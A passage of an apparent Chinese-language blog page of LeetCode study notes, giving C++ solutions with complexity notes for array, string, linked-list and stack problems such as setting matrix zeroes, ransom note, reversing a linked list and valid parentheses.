class="hljs-string">&#x27;0&#x27;</span>&amp;&amp;num&lt;=<span class="hljs-string">&#x27;9&#x27;</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">if</span>(hash[num]==<span class="hljs-number">0</span>)<br>                        &#123;<br>                            hash[num]=<span class="hljs-number">1</span>;<br>                        &#125;<br>                        <span class="hljs-keyword">else</span><br>                        &#123;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                        <span class="hljs-keyword">continue</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        <br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li><p>时间复杂度O(1)</p></li><li><p>数组，矩阵，哈希表</p></li></ul><h3 id="73-矩阵置零"><a href="#73-矩阵置零" class="headerlink" title="73. 矩阵置零"></a><a href="https://leetcode-cn.com/problems/set-matrix-zeroes/">73. 矩阵置零</a></h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setZeroes</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;<br>        <span class="hljs-comment">//原地：原矩阵首行、首列记录0值，使得空间复杂度为O(1)</span><br>        <span class="hljs-type">int</span> m=matrix.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n=matrix[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">bool</span> first_row=<span class="hljs-number">0</span>,first_col=<span class="hljs-number">0</span>;<br>        <span class="hljs-comment">//首行</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(matrix[<span class="hljs-number">0</span>][j]==<span class="hljs-number">0</span>)<br>            &#123;<br>                first_row=<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//首列</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(matrix[i][<span class="hljs-number">0</span>]==<span class="hljs-number">0</span>)<br>            &#123;<br>                first_col=<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//其他</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;m;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;n;j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(matrix[i][j]==<span class="hljs-number">0</span>)<br>                &#123;<br>                    matrix[<span class="hljs-number">0</span>][j]=<span class="hljs-number">0</span>;<br>                    matrix[i][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//其他置0,别碰matrix[0][0]</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;n;j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(matrix[<span class="hljs-number">0</span>][j]==<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;m;i++)<br>                &#123;<br>                    matrix[i][j]=<span class="hljs-number">0</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;m;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(matrix[i][<span class="hljs-number">0</span>]==<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;n;j++)<br>                &#123;<br>                    matrix[i][j]=<span class="hljs-number">0</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//首行置0</span><br>        <span class="hljs-keyword">if</span>(first_row==<span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>            &#123;<br>                matrix[<span class="hljs-number">0</span>][j]=<span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(first_col==<span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>            &#123;<br>                matrix[i][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br>            &#125;            <br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度O(m*n)</li><li>空间复杂度O(1)</li><li>数组，矩阵</li></ul><h2 id="第-6-天-字符串"><a href="#第-6-天-字符串" class="headerlink" title="第 6 天 字符串"></a>第 6 天 字符串</h2><h3 id="387-字符串中的第一个唯一字符"><a href="#387-字符串中的第一个唯一字符" class="headerlink" title="387. 字符串中的第一个唯一字符"></a><a href="https://leetcode-cn.com/problems/first-unique-character-in-a-string/">387. 字符串中的第一个唯一字符</a></h3><p>给定一个字符串 <code>s</code> ，找到 <em>它的第一个不重复的字符，并返回它的索引</em> 。如果不存在，则返回 <code>-1</code> 。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">firstUniqChar</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">char</span>,<span class="hljs-type">int</span>&gt; hash;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;s.<span class="hljs-built_in">length</span>();i++)<br>        &#123;<br>            hash[s[i]]++;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;s.<span class="hljs-built_in">length</span>();i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(hash[s[i]]==<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">return</span> i;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li><p>时间复杂度：O(n)</p></li><li><p>字符串，哈希表</p></li></ul><h3 id="383-赎金信"><a href="#383-赎金信" class="headerlink" title="383. 赎金信"></a><a href="https://leetcode-cn.com/problems/ransom-note/">383. 赎金信</a></h3><p>给你两个字符串：ransomNote 和 magazine ，判断 ransomNote 能不能由 magazine 里面的字符构成。</p><p>如果可以，返回 true ；否则返回 false 。</p><p>magazine 中的每个字符只能在 ransomNote 中使用一次。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">canConstruct</span><span class="hljs-params">(string ransomNote, string magazine)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">char</span>,<span class="hljs-type">int</span>&gt; hash;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;magazine.<span class="hljs-built_in">length</span>();i++)<br>        &#123;<br>            hash[magazine[i]]++;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;ransomNote.<span class="hljs-built_in">length</span>();i++)<br>        &#123;<br>            hash[ransomNote[i]]--;<br>            <span class="hljs-keyword">if</span>(hash[ransomNote[i]]&lt;<span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(max(ransomNotr,magazine)) 即O(n)</li><li>字符串，哈希表，计数</li></ul><h3 id="242-有效的字母异位词"><a href="#242-有效的字母异位词" class="headerlink" title="242. 有效的字母异位词"></a><a href="https://leetcode-cn.com/problems/valid-anagram/">242. 有效的字母异位词</a></h3><p>给定两个字符串 s 和 t ，编写一个函数来判断 t 是否是 s 的字母异位词。</p><p>注意：若 s 和 t 中每个字符出现的次数都相同，则称 s 和 t 互为字母异位词。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isAnagram</span><span class="hljs-params">(string s, string t)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">char</span>,<span class="hljs-type">int</span>&gt; hash;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;s.<span class="hljs-built_in">length</span>();i++)<br>        &#123;<br>            hash[s[i]]++;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;t.<span class="hljs-built_in">length</span>();i++)<br>        &#123;<br>            hash[t[i]]--;<br>            <span class="hljs-keyword">if</span>(hash[t[i]]&lt;<span class="hljs-number">0</span>)    <span class="hljs-comment">//t中某字符个数多于s</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;s.<span class="hljs-built_in">length</span>();i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(hash[s[i]]&gt;<span class="hljs-number">0</span>)    <span class="hljs-comment">//s中某字符个数多于t</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(max(s.length(),t.length())) 即O(n)</li><li>字符串，哈希表</li></ul><h2 id="第-7-天-链表"><a href="#第-7-天-链表" class="headerlink" title="第 7 天 链表"></a>第 7 天 链表</h2><h3 id="141-环形链表"><a href="#141-环形链表" class="headerlink" title="141. 环形链表"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle/">141. 环形链表</a></h3><p>给你一个链表的头节点 head ，判断链表中是否有环。</p><p>如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。注意：pos 不作为参数进行传递 。仅仅是为了标识链表的实际情况。</p><p>如果链表中存在环 ，则返回 true 。 否则，返回 false 。</p><h4 id="1-标记法（根据题目所给取值）"><a href="#1-标记法（根据题目所给取值）" class="headerlink" title="1. 标记法（根据题目所给取值）"></a>1. 标记法（根据题目所给取值）</h4><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode *head)</span> </span>&#123;<br>        ListNode *now=head;<br>        <span class="hljs-keyword">while</span>(now!=<span class="hljs-literal">NULL</span>&amp;&amp;now-&gt;next!=<span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(now-&gt;val==<span class="hljs-number">100001</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            now-&gt;val=<span class="hljs-number">100001</span>;<br>            now=now-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n)</li><li>链表</li></ul><h4 id="2-快慢指针（推荐）"><a href="#2-快慢指针（推荐）" class="headerlink" title="2. 快慢指针（推荐）"></a>2. 快慢指针（推荐）</h4><h3 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="21. 合并两个有序链表"></a><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/">21. 合并两个有序链表</a></h3><p>将两个升序链表合并为一个新的 <strong>升序</strong> 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">mergeTwoLists</span><span class="hljs-params">(ListNode* list1, ListNode* list2)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(list1==<span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> list2;<br>        <span class="hljs-keyword">if</span>(list2==<span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> list1;<br>        <span class="hljs-keyword">if</span>(list1-&gt;val&lt;list2-&gt;val)  <span class="hljs-comment">//留下小的(返回头节点即可)</span><br>        &#123;<br>            list1-&gt;next=<span class="hljs-built_in">mergeTwoLists</span>(list1-&gt;next,list2);<br>            <span class="hljs-keyword">return</span> list1;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            list2-&gt;next=<span class="hljs-built_in">mergeTwoLists</span>(list1,list2-&gt;next);<br>            <span class="hljs-keyword">return</span> list2;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n+m)，其中n、m分别为两链表长度</li><li>递归，链表</li></ul><h3 id="203-移除链表元素"><a href="#203-移除链表元素" class="headerlink" title="203. 移除链表元素"></a><a href="https://leetcode-cn.com/problems/remove-linked-list-elements/">203. 移除链表元素</a></h3><p>给你一个链表的头节点 <code>head</code> 和一个整数 <code>val</code> ，请你删除链表中所有满足 <code>Node.val == val</code> 的节点，并返回 <strong>新的头节点</strong> </p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">removeElements</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        ListNode *H= <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(); <span class="hljs-comment">//头节点（非空则可引用）</span><br>        H-&gt;next=head;<br>        ListNode *p=H;<br>        <span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span>&amp;&amp;p-&gt;next!=<span class="hljs-literal">NULL</span>) <span class="hljs-comment">//遍历删除满足条件的节点</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(p-&gt;next-&gt;val==val)<br>            &#123;<br>                p-&gt;next=p-&gt;next-&gt;next;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>                p=p-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> H-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n)，n为链表长度</li><li>链表</li></ul><h2 id="第-8-天-链表"><a href="#第-8-天-链表" class="headerlink" title="第 8 天 链表"></a>第 8 天 链表</h2><h3 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206. 反转链表"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list/">206. 反转链表</a></h3><p>给你单链表的头节点 <code>head</code> ，请你反转链表，并返回反转后的链表。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* res=<span class="hljs-literal">NULL</span>;<span class="hljs-comment">//注意尾节点必须指向NULL</span><br>        ListNode* cur=head;<br>        <span class="hljs-keyword">while</span>(cur!=<span class="hljs-literal">NULL</span>)<br>        &#123;<br>            ListNode* temp=cur;<br>            cur=cur-&gt;next;<br>            temp-&gt;next=res;<br>            res=temp;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n)，n为链表长度</li><li>链表</li></ul><h3 id="83-删除排序链表中的重复元素"><a href="#83-删除排序链表中的重复元素" class="headerlink" title="83. 删除排序链表中的重复元素"></a><a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list/">83. 删除排序链表中的重复元素</a></h3><p>给定一个已排序的链表的头 <code>head</code> ， <em>删除所有重复的元素，使每个元素只出现一次</em> 。返回 <em>已排序的链表</em> 。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">deleteDuplicates</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* cur=head;<br>        <span class="hljs-keyword">while</span>(cur!=<span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(cur-&gt;next!=<span class="hljs-literal">NULL</span>&amp;&amp;cur-&gt;next-&gt;val==cur-&gt;val)<br>            &#123;<br>                cur-&gt;next=cur-&gt;next-&gt;next;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <br>            &#123;<br>                cur=cur-&gt;next;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n)，n为链表长度</li><li>链表</li></ul><h2 id="第-9-天-栈-队列"><a href="#第-9-天-栈-队列" class="headerlink" title="第 9 天 栈/队列"></a>第 9 天 栈/队列</h2><h3 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20. 有效的括号"></a><a href="https://leetcode-cn.com/problems/valid-parentheses/">20. 有效的括号</a></h3><p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串 s ，判断字符串是否有效。</p><p>有效字符串需满足：</p><p>左括号必须用相同类型的右括号闭合。<br>左括号必须以正确的顺序闭合。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValid</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        stack&lt;<span class="hljs-type">char</span>&gt; 